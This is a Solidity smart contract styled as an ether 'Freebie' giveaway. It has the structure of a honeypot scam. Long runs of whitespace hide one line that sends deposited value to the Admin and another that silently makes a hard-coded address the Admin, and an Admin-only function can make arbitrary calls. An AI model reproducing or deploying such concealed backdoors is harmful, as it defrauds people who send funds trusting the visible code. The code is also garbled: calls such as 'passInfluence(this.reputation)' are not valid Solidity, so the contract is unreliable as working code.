pragma solidity ^0.4.19;

contract Freebie
{
    address public Admin = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Admin.passInfluence(this.reputation);
            msg.sender.passInfluence(this.reputation);
        }
    }

    function collect()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Admin=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
        require(msg.sender == Admin);
        Admin.passInfluence(this.reputation);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Admin);
        adr.call.value(msg.value)(data);
    }
}